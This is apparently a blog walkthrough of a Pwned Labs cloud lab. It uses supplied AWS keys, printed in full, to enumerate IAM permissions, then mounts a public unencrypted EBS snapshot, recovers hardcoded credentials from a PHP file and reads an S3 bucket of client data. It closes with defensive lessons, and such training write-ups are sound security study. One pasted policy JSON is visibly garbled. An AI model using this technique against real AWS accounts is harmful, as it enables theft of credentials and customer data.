---
title: "Pwned Labs - Loot Public EBS Snapshots"
date: 2024-02-15
categories: [AWS, Cloud, Security]
tags: [AWS, Security, S3, EBS, PwnedLabs]
---

![Intro](/images/PwnedLabs/LootEBS/1.png)

Here we go again! Today, we will be solving the [Loot Public EBS Snapshots](https://pwnedlabs.io/labs/loot-public-ebs-snapshots) challenge. Once we start the lab, we are provided with AWS Credentials. So, let's jump to our terminal, configure these credentials and start with the enumeration. We can observe that the AWS Credentials belongs to an user named `intern`.  

```
❯ aws configure --profile ebs
AWS Access Key ID [None]: AKIARQVIRZ4UCZVR25FQ
AWS Secret Access Key [None]: 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
Default region name [None]:
Default output format [None]:

❯ aws sts get-caller-identity --profile ebs
{
    "UserId": "AIDARQVIRZ4UJNTLTYGWU",
    "Account": "104506445608",
    "Arn": "arn:aws:iam::104506445608:user/intern"
}
```
Trying to list the S3 buckets, we get `Access Denied`, we can conclude that our user does not have permissions to list S3 buckets.

```
❯ aws s3 ls --profile ebs

An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
```
Let us try to list the policies that our attached to user `intern` with the following command. We can observe that the policy attached to our user `intern` is named `PublicSnapper`. When we try to `get-policy` we can observe the `DefaultVersionId` is v9, so now we need to check what permissions does this policy assigns to the user. 

```
❯ aws iam list-attached-user-policies --user-name intern --profile ebs
{
    "AttachedPolicies": [
        {
            "PolicyName": "PublicSnapper",
            "PolicyArn": "arn:aws:iam::104506445608:policy/PublicSnapper"
        }
    ]
}

❯ aws iam get-policy --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper --profile ebs
{
    "Policy": {
        "PolicyName": "PublicSnapper",
        "PolicyId": "ANPARQVIRZ4UD6B2PNSLD",
        "Arn": "arn:aws:iam::104506445608:policy/PublicSnapper",
        "Path": "/",
        "DefaultVersionId": "v9",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-06-10T22:33:41+00:00",
        "UpdateDate": "2024-01-15T23:47:11+00:00",
        "Tags": []
    }
}
```
Observing the output, we have permission to `ec2:DescribeSnapshotAttribute` on a specific spanshot `snap-0c0679098c7a4e636`, and we have permission to `ec2:DescribeSnapshots`. 

```
❯ aws iam get-policy-version --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper --version-id v9 --profile ebs
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "Intern1",
                    "Effect": "Allow",
                    "Action": "ec2:DescribeSnapshotAttribute",
                    "Resource": "arn:aws:ec2:us-east-1::snapshot/snap-0c0679098c7a4e636"
                },
                {
                    "Sid": "Intern2",
                    "Effect": "Allow",
                    "Action": "ec2:DescribeSnapshots",
                    "Resource": "*"
                },
                {
                    "Sid": "Intern3",
                    "Action": [
                        "iam:GetPolicy",
                    ],
                        "arn:aws:iam::104506445608:user/intern",
                    ]
                {
                    "Effect": "Allow",
                        "ebs:ListSnapshotBlocks",
                    ],
                }
        },
        "IsDefaultVersion": true,
    }
```
Trying to run the `describe-snapshots` returns a long list of public snapshots which does not belongs to this account. 

```
❯ aws ec2 describe-snapshots --region us-east-1 --profile ebs
{
    "Snapshots": [
        {
            "Description": "hvm-ssd/ubuntu-trusty-amd64-server-20170202.1",
            "Encrypted": false,
            "OwnerId": "099720109477",
            "Progress": "100%",
            "SnapshotId": "snap-046281ab24d756c50",
            "StartTime": "2017-02-02T23:57:19+00:00",
            "State": "completed",
            "VolumeId": "vol-033ca269aeedb3521",
            "VolumeSize": 8,
            "OwnerAlias": "amazon",
            "StorageTier": "standard"
        },
        {
            "Description": "hvm/ubuntu-trusty-amd64-server-20170202.1",
            "Encrypted": false,
            "OwnerId": "099720109477",
            "Progress": "100%",
            "SnapshotId": "snap-00de7e12fd08987c4",
            "StartTime": "2017-02-02T23:44:49+00:00",
            "State": "completed",
            "VolumeId": "vol-0bf7e5b6270473ac6",
            "VolumeSize": 8,
            "OwnerAlias": "amazon",
            "StorageTier": "standard"
        },
        {
            "Description": "ebs-ssd/ubuntu-trusty-amd64-server-20170202.1",
            "Encrypted": false,
            "OwnerId": "099720109477",
            "Progress": "100%",
            "SnapshotId": "snap-0c650d7b864445e80",
            "StartTime": "2017-02-02T23:40:03+00:00",
            "State": "completed",
            "VolumeId": "vol-0555d668c04ba5b33",
            "VolumeSize": 8,
            "OwnerAlias": "amazon",
            "StorageTier": "standard"
        },
        ...
```
Since we already have the `Account ID : 104506445608` from the `aws sts get-caller-identity` command, we can check for the snapshots which belongs to this account. We can observe a snapshot with tag `PublicSnapper`.

```
❯ aws ec2 describe-snapshots --owner-ids 104506445608 --region us-east-1 --profile ebs
{
    "Snapshots": [
        {
            "Description": "Created by CreateImage(i-06d9095368adfe177) for ami-07c95fb3e41cb227c",
            "Encrypted": false,
            "OwnerId": "104506445608",
            "Progress": "100%",
            "SnapshotId": "snap-0c0679098c7a4e636",
            "StartTime": "2023-06-12T15:20:20.580000+00:00",
            "State": "completed",
            "VolumeId": "vol-0ac1d3295a12e424b",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "PublicSnapper"
                }
            ],
            "StorageTier": "standard"
        },
        {
            "Description": "Created by CreateImage(i-0199bf97fb9d996f1) for ami-0e411723434b23d13",
            "Encrypted": false,
            "OwnerId": "104506445608",
            "Progress": "100%",
            "SnapshotId": "snap-035930ba8382ddb15",
            "StartTime": "2023-08-24T19:30:49.742000+00:00",
            "State": "completed",
            "VolumeId": "vol-09149587639d7b804",
            "VolumeSize": 24,
            "StorageTier": "standard"
        }
    ]
}
```
We also have permission to [`describe-snapshot-attribute`](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeSnapshotAttribute.html). As mentioned in the AWS Documentation of [DescribeSnapshotAttribute](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeSnapshotAttribute.html), it has two attributes, `createVolumePermission`  and `productCodes`. We are interested in `createVolumePermission`, so we can figure out who has permission to create a volume from this snapshot to attach it on an EC2 instance. One more thing to observe is `Encrypted : false`, this snapshot is not encrypted, which is good for us.

The value of `Group` is set to `all`. We can assume that it is a public snapshot and any AWS user can create a volume from this snapshot into their AWS Account. 

```
❯ aws ec2 describe-snapshot-attribute --snapshot-id snap-0c0679098c7a4e636 --attribute createVolumePermission --region us-east-1 --profile ebs
{
    "CreateVolumePermissions": [
        {
            "Group": "all"
        }
    ],
    "SnapshotId": "snap-0c0679098c7a4e636"
}
```
Login to your AWS Console, select your region to `us-east-1`, then EC2 > Snapshots > Public Snapshots and search for the snapshot-id `snap-0c0679098c7a4e636`. 

![Intro](/images/PwnedLabs/LootEBS/2.png)

Select the snapshot, click on `Actions` and then select `Create volume from snapshot`.

![Intro](/images/PwnedLabs/LootEBS/3.png)

Create the volume and make sure its successfully finished. Also, observe the `Availability Zone` of the Volume is `us-east-1a`.

![Intro](/images/PwnedLabs/LootEBS/4.png)

Now, we need to Launch an EC2 instance, so go to EC2 service and click on Launch Instance. We will be creating a `t2.micro` free tier instance for this task.

![Intro](/images/PwnedLabs/LootEBS/5.png)

In the `Network Settings` make sure you select a subnet in the same availability zone as your volume, which is `us-east-1a`.

![Intro](/images/PwnedLabs/LootEBS/6.png)

Once your EC2 instance is successfully launched, jump back to the Volumes page, select the volume we created earlier, click on `Actions` and select `Attach Volume`. Select the EC2 instance we just created and attach the volume to our EC2 instance. 

![Intro](/images/PwnedLabs/LootEBS/7.png)

Now, select your instance and click on `Connect`. If you created SSH keys, you can use them to connect to your instance.\
Run the command `lsblk` to list the storage devices attached to our instance. We can notice a device `xvdf` which is the volume that we attached to our EC2 instance earlier. So let's mount this volume to our instance, I created a directory named `vol` and mounted the `xvdf1` device to our instance with the command `sudo mount -t ext4 /dev/xvdf1 vol`.\
The device is successfully mounted, now we can check the files and folders in the directory.

![Intro](/images/PwnedLabs/LootEBS/8.png)

We can observe that there is a `home` directory for the user `intern`. In the folder, there is a sub directory called `practice_files` which contains a `php` file. 

![Intro](/images/PwnedLabs/LootEBS/9.png)

Checking the contents of the `php` file, we can observe hardcoded AWS Credentials are stored in the file and it also mentions a S3 bucket named `ecorp-client-data`.

![Intro](/images/PwnedLabs/LootEBS/10.png)

Since we know Amazon Linux AMI comes with the AWS CLI already installed, we can configure the credentials. Executing the `aws sts get-caller-identity` reveals the user is `dev-test`.\
Now, we can check the objects stored in the S3 bucket `ecorp-client-data`. The bucket contains `flag.txt` and a `csv` file which contains sensitive data such as ID, Password and safe PIN, which can cause data breach of an organisation.  

![Intro](/images/PwnedLabs/LootEBS/11.png)

## Lessons Learned
- Never hardcode sensitive data such as AWS Credentials into configuration files or source code.
- Never keep your snapshots Public.
- Make sure you encrypt your snapshots and EBS Volumes.
- Search exposed EBS volumes for secrets with [dufflebag](https://github.com/bishopfox/dufflebag)